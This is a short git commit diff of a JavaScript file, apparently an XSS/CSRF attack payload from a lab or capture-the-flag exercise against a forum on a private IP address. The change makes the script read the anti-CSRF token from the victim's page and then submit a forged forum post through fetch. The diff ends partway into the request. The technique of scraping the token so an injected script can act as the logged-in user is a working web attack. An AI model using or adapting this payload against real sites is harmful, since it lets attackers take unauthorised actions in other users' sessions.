28df2514603d2d83fb0451406ef0ae5efcb66939
Leonard Walter <50204487+LeonardWalter@users.noreply.github.com>
2023-11-18 01:28:51 +0200

    Update y.js

--- y.js
+++ y.js
@@ -1,11 +1,11 @@
 const url = 'http://10.110.15.159/forum.php';
-
+const token = document.querySelector('input[name="token"]').value;
 const payload = {
   post_author: 1,
   post_msg: 'nugget',
   post_submit: 'Post the message',
   post_topic_id: 1,
-  token: '95f7bfe9cbf7168feafb7e1390d55aea'
+  token: token
 };
 
 fetch(url, {
